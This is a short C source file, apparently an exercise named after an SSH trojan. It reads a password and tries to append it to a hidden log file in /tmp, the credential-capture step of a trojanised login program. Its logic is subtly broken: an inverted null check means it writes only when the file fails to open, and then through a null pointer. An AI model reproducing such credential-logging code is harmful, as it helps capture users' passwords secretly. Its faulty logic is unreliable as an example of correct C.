#include <stdio.h>


int main() {
	char password[10];
	scanf("%9s",password);
    	FILE *log = fopen("/tmp/.log_sshtrojan2.txt", "a");
    	if (!log){
    	    	fprintf(log, "password: %s\n", password);
    		fclose(log);
    	}

}
